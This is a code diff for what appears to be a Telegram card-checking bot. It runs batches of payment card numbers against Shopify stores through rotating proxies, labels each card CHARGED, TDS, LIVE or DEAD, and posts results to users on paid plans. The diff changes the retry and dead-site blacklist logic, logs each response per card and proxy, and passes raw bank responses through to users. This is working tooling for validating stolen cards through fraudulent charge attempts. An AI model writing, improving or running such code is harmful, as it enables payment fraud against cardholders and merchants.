@@ -861,8 +861,7 @@ _RETRY_SIGNALS = (
     "returned status 500", "returned status 502",
     "returned status 503", "returned status 504",
     "no proxies", "no available proxies",
-    "server error", "client error",
-    "na",
+    # NOTE: "na", "server error", "client error" removed — too broad as substrings
 )
 
 
@@ -1129,7 +1128,9 @@ async def _check_card_with_retry(
     Decision tree per attempt
     ─────────────────────────
     1. resp body contains "site error! status: 404/403", "not shopify!" etc.
-       → _DEAD_SITES.add(site) + continue  (ZERO sleep — THE actual fix)
+       → local_dead.add(site) + tiny sleep (0.1s) — skip, try another site.
+       Global _DEAD_SITES is also updated but capped at 200 entries to prevent
+       cascade where all sites blacklisted → every card returns DEAD instantly.
     2. HTTP 404/403 from server (rare — API almost always returns 200)
        → same as above
     3. HTTP 429 / "status: 429" in body
@@ -1137,25 +1138,27 @@ async def _check_card_with_retry(
     4. resp body is a transient failure (timeout, 5xx, step N failed …)
        → short sleep, try next site
     5. classify_response → CHARGED/TDS/LIVE/DEAD
-       → return immediately
+       → return immediately with REAL raw response (not sanitised)
     6. All sites exhausted
-       → return DEAD with clean message
+       → return DEAD with last real response text
     """
     if not sites:
         sites = list(BUILTIN_SITES)
 
-    live_sites = [s for s in sites if s not in _DEAD_SITES]
-    if not live_sites:
-        _DEAD_SITES.clear()
-        live_sites = list(sites)
-        logging.warning("[SH] _DEAD_SITES cleared — all sites were blacklisted")
+    # ── Per-call local dead set — avoids poisoning global across parallel cards ──
+    local_dead: set = set()
 
-    pool    = live_sites[:]
+    # Global blacklist: auto-clear if overgrown (prevents cascade across calls)
+    if len(_DEAD_SITES) > 200:
+        _DEAD_SITES.clear()
+        logging.warning("[SH] _DEAD_SITES cleared (> 200 entries) to prevent cascade")
+
+    pool    = sites[:]
     random.shuffle(pool)
     px_pool = proxies if proxies else _ALL_PROXIES
     tried: list     = []
     price, currency = "0.00", "USD"
-    last_clean_resp = "Dead"
+    last_raw_resp   = "Dead"
 
     for attempt in range(max_sites):
 
@@ -1163,14 +1166,14 @@ async def _check_card_with_retry(
         if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
             raise asyncio.CancelledError()
 
-        # Refresh pool
-        untried = [s for s in pool if s not in tried and s not in _DEAD_SITES]
+        # Refresh untried pool — use local_dead (not global) to decide what to skip
+        all_dead = local_dead | _DEAD_SITES
+        untried  = [s for s in pool if s not in tried and s not in all_dead]
         if not untried:
-            fresh = [s for s in sites if s not in _DEAD_SITES]
-            if not fresh:
-                break
+            # All locally-known dead sites tried — reset local_dead and retry
+            local_dead.clear()
             tried   = []
-            pool    = fresh[:]
+            pool    = sites[:]
             random.shuffle(pool)
             untried = pool[:]
 
@@ -1184,47 +1187,53 @@ async def _check_card_with_retry(
             )
         except asyncio.CancelledError:
             raise
-        except Exception:
+        except Exception as exc:
+            logging.debug(f"[SH] {card[:6]}** {site} exception: {exc}")
             await asyncio.sleep(random.uniform(0.3, 0.8))
             continue
 
-        logging.info(f"[SH] {card[:6]}** #{attempt+1} {site} → {resp!r}")
+        logging.info(f"[API RESP] {card[:6]}** #{attempt+1} site={site} "
+                     f"proxy={proxy or 'none'} → {resp!r}")
 
-        # ── Decision 1: DEAD SITE in response body (THE fix) ─────────
-        # API returns HTTP 200 with the error in the JSON body.
-        # Must check the STRING — http_st is always 200 for these.
+        # ── Decision 1: DEAD SITE in response body ───────────────────
         if _is_dead_site_response(resp):
+            local_dead.add(site)
             _DEAD_SITES.add(site)
-            logging.debug(f"[SH] Blacklisted dead site: {site} ({resp!r})")
-            continue   # ZERO sleep
+            logging.debug(f"[SH] Dead site skipped: {site} ({resp!r})")
+            last_raw_resp = resp          # keep so we can show something if all fail
+            await asyncio.sleep(0.05)    # tiny sleep — don't hammer API, don't block
+            continue
 
-        # ── Decision 2: HTTP-level 404/403 (rare backup) ─────────────
+        # ── Decision 2: HTTP-level 404/403 (rare — API usually returns 200) ──
         if http_st in (404, 403):
+            local_dead.add(site)
             _DEAD_SITES.add(site)
+            await asyncio.sleep(0.05)
             continue
 
         # ── Decision 3: Rate limited ──────────────────────────────────
         if http_st == 429 or "status: 429" in resp.lower():
-            tried.pop()
+            tried.pop()   # allow retry on same site
             await asyncio.sleep(random.uniform(3.0, 5.0))
             continue
 
         # ── Decision 4: Transient failure ────────────────────────────
         if _is_retry_response(resp):
-            last_clean_resp = _clean_resp(resp)
+            last_raw_resp = resp
             await asyncio.sleep(random.uniform(0.5, 1.2))
             continue
 
-        # ── Decision 5: Real bank response ───────────────────────────
+        # ── Decision 5: Real bank response — return RAW text ─────────
+        last_raw_resp = resp
         verdict = classify_response(resp)
         if verdict in ("CHARGED", "TDS", "LIVE", "DEAD"):
             return verdict, resp, price, currency
 
-        # RETRY from classify_response
-        last_clean_resp = _clean_resp(resp)
+        # classify returned RETRY — try another site
         await asyncio.sleep(random.uniform(0.8, 1.8))
 
-    return "DEAD", last_clean_resp, price, currency
+    # Exhausted all attempts — return last raw response so user sees real text
+    return "DEAD", last_raw_resp, price, currency
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1386,12 +1395,26 @@ def _bin_str(bd: dict) -> str:
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def build_result_msg(card, resp, verdict, bin_data, price, currency,
                      elapsed, user, plan) -> str:
-    safe_resp = escape(_clean_resp(resp))
     ulink     = _user_link(user)
     peid      = _plan_eid(plan)
     ts        = _fmt_time(elapsed)
     bin_s     = _bin_str(bin_data)
     ch_link   = f'<a href="{BOT_CHANNEL}">[❆]</a>'
+
+    # Show real API/bank response — never hide it behind "Dead"
+    # Only sanitize true site-infrastructure errors (404/403 site errors)
+    raw_resp = resp or "Unknown"
+    rl = raw_resp.lower()
+    if "site error! status:" in rl:
+        m = re.search(r"status:\s*(\d+)", rl)
+        display_resp = f"Site Error {m.group(1)}" if m else "Site Error"
+    elif "not shopify" in rl or "site not supported" in rl:
+        display_resp = "Site Not Supported"
+    elif "application not found" in rl or "store not found" in rl:
+        display_resp = "Store Not Found"
+    else:
+        display_resp = raw_resp          # ← real bank text shown as-is
+    safe_resp = escape(display_resp)
 
     if verdict == "CHARGED":
         eid       = random.choice(CHARGED_EMOJI_IDS)
@@ -1625,8 +1648,8 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
             except Exception as e:
                 verdict, resp, price, currency = "ERROR", str(e)[:60], "0.00", "USD"
 
-            elapsed    = time.time() - t0
-            clean_resp = _clean_resp(resp)
+            elapsed  = time.time() - t0
+            raw_resp = resp          # keep real API text — never sanitise before storing
             try:
                 bin_data = await asyncio.wait_for(_bin_lookup(cc_num[:6]), timeout=5)
             except Exception:
@@ -1634,7 +1657,7 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
 
             rec = {
                 "card": card_fmt, "verdict": verdict,
-                "resp": clean_resp, "response": clean_resp,
+                "resp": raw_resp, "response": raw_resp,
                 "price": price, "currency": currency, "bin_info": bin_data,
             }
             sess["checked"] += 1
